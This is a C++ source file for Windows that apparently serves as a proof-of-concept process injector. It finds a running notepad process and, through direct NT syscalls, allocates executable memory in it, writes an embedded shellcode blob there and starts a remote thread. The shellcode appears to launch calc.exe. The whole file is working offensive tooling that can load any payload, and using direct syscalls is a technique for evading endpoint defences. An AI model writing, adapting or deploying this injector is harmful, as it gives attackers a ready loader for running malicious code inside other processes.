#include <windows.h>
#include <cstdio>
#include <unistd.h>
#include "../../include/syscalls.h"
#include "../../include/utils.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

const unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61"
        "\x6c\x63\x2e\x65\x78\x65\x00";

DWORD WaitForNotepad() {
    DWORD dNotepadPid = 0;
    int i = 0;
    while (true) {
        printf("[-] Searching for notepad...\n");
        dNotepadPid = FindFirstNotepad();
        if (!dNotepadPid) {
            printf("[!] No notepad found! Waiting for round %d...\n", i++);
            sleep(5);
        }
        else break;
    }
    return dNotepadPid;
}

int CheckNTStatus(NTSTATUS status) {
    if (!NT_SUCCESS(status)) {
        printf("[!] Error | 0x%08lx\n", status);
        exit(EXIT_FAILURE);
    }
    return 0;
}

int main() {
    HANDLE hNotepad = nullptr, hThread = nullptr;
    OBJECT_ATTRIBUTES oa = {sizeof oa, nullptr};
    CLIENT_ID clientId = {nullptr, nullptr};
    LPVOID lpBaseAddress = nullptr;
    size_t uiAvailableSize = sizeof(shellcode), uiWrittenSize;
    NTSTATUS status;
    // Open Process
    DWORD dNotepadPid = WaitForNotepad();
    clientId.UniqueProcess = (HANDLE) dNotepadPid;
    status = NtOpenProcess(&hNotepad, PROCESS_ALL_ACCESS, &oa, &clientId);
    CheckNTStatus(status);
    printf("[+] Successfully opened process %lu | 0x%x\n", dNotepadPid, hNotepad);
    // Allocate memory
    printf("[+] Need to allocate %zu bytes\n", uiAvailableSize);
    status = NtAllocateVirtualMemory(hNotepad, &lpBaseAddress, 0, &uiAvailableSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    CheckNTStatus(status);
    printf("[+] Actually allocated %zu bytes\n", uiAvailableSize);
    // Write process memory
    status = NtWriteVirtualMemory(hNotepad, lpBaseAddress, (PVOID) &shellcode, sizeof(shellcode), &uiWrittenSize);
    CheckNTStatus(status);
    printf("[+] Wrote %zu bytes\n", uiWrittenSize);
    // Create remote thread
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hNotepad, lpBaseAddress, nullptr, 0x00000004, 0, 0, 0,
                              nullptr);
    printf("[+] Opened thread\n");
    CheckNTStatus(status);
    // Close everything and cleanup
    WaitForSingleObject(hNotepad, INFINITE);
    NtClose(hThread);
    NtClose(hNotepad);
    printf("[+] Closed handle to process %lu\n", dNotepadPid);
    return EXIT_SUCCESS;
}